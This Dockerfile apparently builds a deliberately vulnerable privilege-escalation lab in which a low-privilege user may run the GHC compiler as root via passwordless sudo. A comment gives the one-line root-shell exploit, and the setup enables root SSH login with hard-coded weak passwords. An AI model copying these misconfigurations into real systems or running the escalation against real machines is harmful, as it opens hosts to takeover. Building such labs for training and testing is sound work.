FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_ghc
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/ghc as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and GHC (Glasgow Haskell Compiler)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        ghc \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify ghc is installed
RUN which ghc && ls -la /usr/bin/ghc

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# GHC can evaluate arbitrary Haskell expressions via -e flag.
# The exploit approach:
#   sudo ghc -e 'System.Process.callCommand "/bin/sh"'
# This spawns a root shell since ghc is run as root via sudo.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/ghc" > /etc/sudoers.d/ghc && \
    chmod 440 /etc/sudoers.d/ghc

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]